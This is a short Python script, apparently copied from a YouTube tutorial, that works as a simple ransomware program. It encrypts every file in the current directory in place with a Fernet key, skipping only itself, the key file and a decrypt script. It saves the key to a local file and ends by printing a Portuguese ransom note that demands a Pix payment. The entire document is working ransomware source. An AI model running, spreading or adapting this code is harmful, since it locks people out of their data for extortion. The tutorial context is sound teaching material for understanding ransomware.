#!/usr/bin/env python3

#from https://www.youtube.com/watch?v=UtMMjXOlRQc&ab_channel=NetworkChuck

from cryptography.fernet import Fernet
import os

#finding files
files = []
for file in os.listdir():
    #ignore the .py file and the key file before using .append
    if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    # using .isfile to add files ONLY and nor directories
    if os.path.isfile(file):
        files.append(file)
print(files)

#generating the key from the Fernet lib
key = Fernet.generate_key()

#thekey.key is a new created file. if the file already exists, .open will open it. wb is write binary
with open("thekey.key", "wb") as thekey:
    #writting the variable KEY inside of the file THEKEY
    thekey.write(key)

for file in files:
    #rb is read bynary
    with open(file, "rb") as thefile:
        contents = thefile.read()
    #finally encrypting the data inside CONTENTS using the KEY
    contents_encrypted = Fernet(key).encrypt(contents)
    #after encrypting, we have to write the files back, encrypted 
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)


print("\nTa tudo encriptado mano, manda pix que o pae libera\n")